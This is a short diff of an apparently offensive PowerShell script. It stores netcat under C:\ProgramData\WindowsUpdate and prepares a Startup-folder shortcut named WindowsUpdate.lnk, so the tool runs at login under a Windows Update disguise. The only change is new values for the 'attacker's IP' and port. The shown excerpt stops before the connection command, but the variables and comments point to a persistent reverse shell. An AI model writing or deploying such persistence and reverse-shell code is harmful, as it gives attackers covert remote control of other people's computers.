@@ -1,8 +1,8 @@
 $ncPath = "C:\ProgramData\WindowsUpdate\nc.exe"  # Shared location
 $startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 $shortcutPath = "$startupFolder\WindowsUpdate.lnk"
-$ip = "192.168.1.100"  # Change this to your attacker's IP
-$port = "4444"         # Change this to your desired port
+$ip = "192.168.1.200"  # Change this to your attacker's IP
+$port = "12869"         # Change this to your desired port
 
 # Ensure Netcat is installed in a shared directory
 if (!(Test-Path $ncPath)) {
